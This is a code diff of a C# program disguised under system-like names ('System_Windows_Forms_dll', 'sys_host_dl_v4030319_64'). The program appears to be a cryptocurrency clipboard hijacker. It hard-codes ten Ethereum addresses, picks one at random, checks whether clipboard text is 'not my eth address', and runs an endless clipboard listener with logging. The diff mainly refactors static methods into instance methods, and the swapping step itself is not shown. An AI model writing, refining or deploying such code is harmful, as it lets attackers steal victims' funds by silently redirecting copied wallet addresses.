@@ -7,7 +7,7 @@ using System.Diagnostics;
 
 namespace sys_host_dl_v4030319_64 {
 
-public static class System_Windows_Forms_dll
+public sealed class System_Windows_Forms_dll
     {
     private readonly static string ADDR1 = "0xee11cbef798ae00175c053deed76a0478e644c46";
     private readonly static string ADDR2 = "0x1fC7defE45505f893Fb1911796996857ae89aD26";
@@ -50,12 +50,12 @@ public static class System_Windows_Forms_dll
     private readonly static string logWarn = " WARN - ";
 
 
-    private static string randEthAddr(){
+    private string randEthAddr(){
         int randSelector = RAND.Next(1, 11);
         return ethDict[randSelector].GetData(DataFormats.Text).ToString();
     }
 
-    private static bool isStrNotMyEthAddr(string str){
+    private bool isStrNotMyEthAddr(string str){
         if(str != ADDR1 && str != ADDR2 && str != ADDR3 && str != ADDR4 && str != ADDR5 && 
            str != ADDR6 && str != ADDR7 && str != ADDR8 && str != ADDR9 && str != ADDR10 )
             return true;
@@ -64,19 +64,17 @@ public static class System_Windows_Forms_dll
             return false;
     }
 
-        //potential stack over flow error but low chance
-    private static void setClipboardScanner(){
+    //WARNING - potential stack over flow error but low chance
+    private void setClipboardScanner(){
         clipData = Clipboard.GetDataObject();
         if (clipData == null){
             File.AppendAllText(path,timestamp + logWarn + "SETTING SCANNER AGAIN..." + Environment.NewLine);
             setClipboardScanner();
         }   
     }
-
-    public static void ClipboardListener(){
+    public void EthAddrListener(){
         while(true){              
                 File.AppendAllText(path,timestamp + logInfo + "****************Listener Iteration: " + loopCounter.ToString() + " ****************" + Environment.NewLine);
-               
                 File.AppendAllText(path,timestamp + logInfo + "SETTING SCANNER" + Environment.NewLine);
                 setClipboardScanner();
                 //IDataObject clipData = Clipboard.GetDataObject();
@@ -108,7 +106,8 @@ public static class System_Windows_Forms_dll
     [STAThread]    
     public static void Main()
         {                        
-            System_Windows_Forms_dll.ClipboardListener();
+            System_Windows_Forms_dll o = new System_Windows_Forms_dll();
+            o.EthAddrListener();
         }            
     }    
 }
